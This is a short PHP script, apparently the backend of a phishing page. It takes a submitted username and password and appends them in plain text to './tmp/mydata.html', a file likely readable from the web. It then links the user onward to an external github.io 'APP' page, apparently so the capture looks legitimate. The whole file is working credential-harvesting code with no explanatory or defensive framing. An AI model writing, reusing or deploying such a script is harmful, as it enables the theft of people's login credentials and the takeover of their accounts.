<?php
if(isset($_POST['username']) && isset($_POST['password'])) {
    $data = $_POST['username'] . '-' . $_POST['password'] . "\r\n";
    
    $ret = file_put_contents('./tmp/mydata.html', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        echo "$ret bytes written to file<br />";
        
        echo "<a href='https://jasminajaca011.github.io/app.html'>Enter into APP</a>";
    }
}
else {
   die('no post data to process');
}